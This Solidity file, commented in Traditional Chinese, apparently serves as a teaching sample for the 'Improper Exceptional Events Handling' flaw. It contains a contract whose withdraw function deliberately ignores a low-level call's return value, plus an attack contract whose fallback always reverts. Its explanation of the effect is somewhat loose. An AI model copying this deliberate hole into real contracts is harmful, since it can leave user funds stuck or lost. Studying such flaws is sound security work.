// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0;

// VulnerableContract 合約示範 Improper Exceptional Events Handling 漏洞
// 漏洞重點：在 withdraw 函式中，使用低階 call 傳送 Ether 時，未檢查回傳值 (success)。
// 當接收合約的 fallback 函式故意 revert 時，withdraw 操作未能正確處理例外事件，可能導致原子性問題和資金流失。

contract VulnerableContract {
    mapping(address => uint) public balances; // 漏洞重點：狀態變數未保護操作原子性

    // 使用者存款函式
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    // 漏洞函式 withdraw：在呼叫外部地址 (msg.sender) 時，使用 call 但未檢查回傳結果
    function withdraw() external {
        uint amount = balances[msg.sender];
        require(amount > 0, "No balance");
        // 更新狀態：先將餘額歸零以符合 Checks-Effects-Interactions 模式
        balances[msg.sender] = 0;
        // 不當處理例外事件：未檢查回傳值
        (bool success, ) = msg.sender.call{value: amount}("");
        // 若呼叫失敗，理論上應該恢復狀態，但此處未做任何處理
        // 漏洞：如果 msg.sender 的 fallback 函式故意 revert，將導致 withdraw 操作出現非預期行為
    }

    // 正確接收 Ether 的 fallback 函式
    receive() external payable {}
}

// 攻擊合約：利用 VulnerableContract 的 withdraw 漏洞
// 攻擊步驟：
// 1. 部署 VulnerableContract
// 2. 部署 AttackContract 並指向 VulnerableContract 位址
// 3. 透過 AttackContract 呼叫 attack()，該函式會先 deposit 再 withdraw
// 4. withdraw 時，因為 AttackContract 的 fallback 故意 revert，導致外部呼叫失敗，進而影響原子性

contract AttackContract {
    VulnerableContract public vulnerable;

    // 修改建構子，將 _vulnerableAddress 參數型別設為 address payable 解決類型轉換問題
    constructor(address payable _vulnerableAddress) {
        vulnerable = VulnerableContract(payable(_vulnerableAddress));
    }

    // fallback 函式，故意 revert 以使外部呼叫失敗
    fallback() external payable {
        revert("Fallback always fails");
    }

    // 攻擊函式：先 deposit 再 withdraw
    function attack() external payable {
        require(msg.value > 0, "Send ETH");
        vulnerable.deposit{value: msg.value}();
        // 此 withdraw 呼叫會因為我們的 fallback 故意 revert 而失敗，造成操作非原子性
        vulnerable.withdraw();
    }
}

/*
繁體中文說明：
本漏洞版本中 VulnerableContract 的 withdraw 函式在進行 Ether 傳送時，使用了低階的 call 方法，但未檢查呼叫是否成功。
若攻擊者透過部署一個具有惡意 fallback 函式（故意 revert）的合約，當該 fallback 被觸發時，withdraw 函式並不會正確處理這個失敗狀況。
這可能導致資金無法正確轉移，並使交易處於不一致的狀態，因此構成了一個 Improper Exceptional Events Handling 漏洞。
*/